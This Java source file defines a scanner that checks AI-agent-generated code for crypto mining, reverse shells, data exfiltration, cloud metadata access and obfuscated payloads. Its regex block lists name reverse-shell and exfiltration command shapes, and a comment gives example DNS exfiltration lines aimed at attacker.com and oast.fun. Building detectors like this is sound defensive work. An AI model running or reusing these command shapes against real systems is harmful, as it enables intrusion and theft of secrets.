package com.navneet.executespec.security;

import java.util.List;
import java.util.regex.Pattern;

import org.springframework.stereotype.Component;

import lombok.extern.slf4j.Slf4j;

/**
 * Scans agent-generated code for malicious patterns: crypto mining, reverse shells, credential
 * harvesting, and obfuscated payloads.
 *
 * <p>Integrated into FileSystemTool.writeFile() to flag (and optionally block) dangerous content
 * before it's written to disk.
 */
@Slf4j
@Component
public class CodeAbuseScanner {

  /** Patterns that indicate crypto mining activity. */
  private static final List<Pattern> MINING_PATTERNS =
      List.of(
          Pattern.compile("stratum\\+tcp://"),
          Pattern.compile("\\bxmrig\\b", Pattern.CASE_INSENSITIVE),
          Pattern.compile("\\bcoinhive\\b", Pattern.CASE_INSENSITIVE),
          Pattern.compile("\\bcryptonight\\b", Pattern.CASE_INSENSITIVE),
          Pattern.compile("\\bminergate\\b", Pattern.CASE_INSENSITIVE),
          Pattern.compile("\\bethminer\\b", Pattern.CASE_INSENSITIVE));

  /** Patterns that indicate reverse shell or backdoor creation. */
  private static final List<Pattern> SHELL_PATTERNS =
      List.of(
          Pattern.compile("bash\\s+-i\\s+>&\\s+/dev/tcp/"),
          Pattern.compile("nc\\s+-e\\s+/bin/(sh|bash)"),
          Pattern.compile("\\bsocat\\b.*\\bexec\\b"),
          Pattern.compile("python.*socket\\..*connect.*\\bos\\.(dup2|popen)"),
          Pattern.compile("/dev/tcp/\\d+\\.\\d+\\.\\d+\\.\\d+"),
          Pattern.compile("\\bmkfifo\\b.*\\bnc\\b"),
          // PowerShell reverse shells
          Pattern.compile("\\bInvoke-Expression\\b", Pattern.CASE_INSENSITIVE),
          Pattern.compile(
              "\\bNew-Object\\s+.*\\.Net\\.Sockets\\.TCPClient\\b", Pattern.CASE_INSENSITIVE),
          Pattern.compile("\\bIEX\\s*\\(", Pattern.CASE_INSENSITIVE),
          Pattern.compile("\\bpowershell\\b.*-e(nc|ncodedcommand)?\\s+", Pattern.CASE_INSENSITIVE),
          // Bash variable indirection (obfuscation technique)
          Pattern.compile("\\$\\{!\\w+\\}"));

  /** Patterns that indicate data exfiltration. */
  private static final List<Pattern> EXFIL_PATTERNS =
      List.of(
          Pattern.compile("curl\\s+.*-d\\s+@/etc/passwd"),
          Pattern.compile("curl\\s+.*--data-binary\\s+@"),
          Pattern.compile("wget\\s+.*--post-file"),
          Pattern.compile("\\bfetch\\s*\\(.*document\\.cookie", Pattern.CASE_INSENSITIVE),
          // B-26 fix (2026-05-09) — DNS exfiltration. Pre-fix patterns matched
          // any `dig`/`nslookup` followed by `$(` anywhere — including in an
          // unclosed half-subshell that the shell wouldn't actually execute.
          // False-positive examples that the old patterns flagged: a doc snippet
          // containing the literal text "dig $(whatever" (no closing paren), a
          // tutorial showing the syntax of subshells, a test command like
          // `nslookup example.com` followed by an unrelated `$(date)` later in
          // the same buffer.
          //
          // Narrowed: require the subshell be CLOSED (real invocation) AND
          // appear in arg position (whitespace + `$(...)`). Real exfil shapes
          // (`dig $(whoami).attacker.com`, `nslookup $(curl ...).oast.fun`) all
          // close their subshell — that's the operational shape, not an open
          // paren in random prose.
          Pattern.compile("\\bdig\\b\\s+\\S*\\$\\([^)]+\\)"),
          Pattern.compile("\\bnslookup\\b\\s+\\S*\\$\\([^)]+\\)"),
          Pattern.compile("\\bburpcollaborator\\.net\\b", Pattern.CASE_INSENSITIVE),
          Pattern.compile("\\binteractsh\\.com\\b", Pattern.CASE_INSENSITIVE),
          Pattern.compile("\\boast\\.(fun|pro|me)\\b", Pattern.CASE_INSENSITIVE));

  /** Patterns that indicate cloud metadata endpoint access. */
  private static final List<Pattern> METADATA_PATTERNS =
      List.of(
          Pattern.compile("169\\.254\\.169\\.254"),
          Pattern.compile("metadata\\.google\\.internal", Pattern.CASE_INSENSITIVE),
          Pattern.compile("metadata\\.azure\\.com", Pattern.CASE_INSENSITIVE),
          Pattern.compile("/latest/meta-data/"));

  /** Patterns that indicate obfuscated payloads. */
  private static final List<Pattern> OBFUSCATION_PATTERNS =
      List.of(
          Pattern.compile("eval\\s*\\(\\s*atob\\s*\\("),
          Pattern.compile("eval\\s*\\(\\s*Buffer\\.from\\s*\\("),
          Pattern.compile("eval\\s*\\(\\s*String\\.fromCharCode"),
          // Base64-encoded strings longer than 500 chars (likely embedded binary)
          Pattern.compile("[A-Za-z0-9+/]{500,}={0,2}"));

  public record ScanResult(boolean flagged, String category, String detail) {
    public static ScanResult clean() {
      return new ScanResult(false, null, null);
    }

    public static ScanResult flagged(String category, String detail) {
      return new ScanResult(true, category, detail);
    }
  }

  /**
   * Level-aware wrapper. At LOW this is a pure passthrough of {@link #scan(String, String)}
   * (callers decide warn-vs-block, matching historical behaviour). At MEDIUM or HIGH any flagged
   * scan is converted into a {@link org.springframework.web.server.ResponseStatusException} (400),
   * so callers that want level-aware blocking don't have to duplicate the check at every call-site.
   *
   * <p>Plan 1 P2 — see {@code docs/plans/guardrail-levels-execution-plan.md}.
   */
  public ScanResult scan(
      String filePath,
      String content,
      com.navneet.executespec.security.guardrail.GuardrailLevel level) {
    ScanResult result = scan(filePath, content);
    if (result.flagged() && level != null && level.atLeastMedium()) {
      log.warn(
          "CODE ABUSE BLOCKED (guardrail={}): file={} category={} pattern={}",
          level,
          filePath,
          result.category(),
          result.detail());
      throw new org.springframework.web.server.ResponseStatusException(
          org.springframework.http.HttpStatus.BAD_REQUEST,
          "Generated content matched a "
              + result.category()
              + " pattern (guardrail level "
              + level
              + ").");
    }
    return result;
  }

  /**
   * Scans file content for malicious patterns.
   *
   * @param filePath the file being written (for logging)
   * @param content the file content to scan
   * @return scan result indicating CLEAN or FLAGGED with details
   */
  public ScanResult scan(String filePath, String content) {
    if (content == null || content.isBlank()) return ScanResult.clean();

    for (Pattern p : MINING_PATTERNS) {
      if (p.matcher(content).find()) {
        log.warn("CODE ABUSE FLAGGED (mining): file={}, pattern={}", filePath, p.pattern());
        return ScanResult.flagged("CRYPTO_MINING", p.pattern());
      }
    }

    for (Pattern p : SHELL_PATTERNS) {
      if (p.matcher(content).find()) {
        log.warn("CODE ABUSE FLAGGED (reverse shell): file={}, pattern={}", filePath, p.pattern());
        return ScanResult.flagged("REVERSE_SHELL", p.pattern());
      }
    }

    for (Pattern p : EXFIL_PATTERNS) {
      if (p.matcher(content).find()) {
        log.warn("CODE ABUSE FLAGGED (exfiltration): file={}, pattern={}", filePath, p.pattern());
        return ScanResult.flagged("DATA_EXFILTRATION", p.pattern());
      }
    }

    for (Pattern p : METADATA_PATTERNS) {
      if (p.matcher(content).find()) {
        log.warn(
            "CODE ABUSE FLAGGED (metadata access): file={}, pattern={}", filePath, p.pattern());
        return ScanResult.flagged("METADATA_ACCESS", p.pattern());
      }
    }

    for (Pattern p : OBFUSCATION_PATTERNS) {
      if (p.matcher(content).find()) {
        log.warn("CODE ABUSE FLAGGED (obfuscation): file={}, pattern={}", filePath, p.pattern());
        return ScanResult.flagged("OBFUSCATED_PAYLOAD", p.pattern());
      }
    }

    return ScanResult.clean();
  }
}
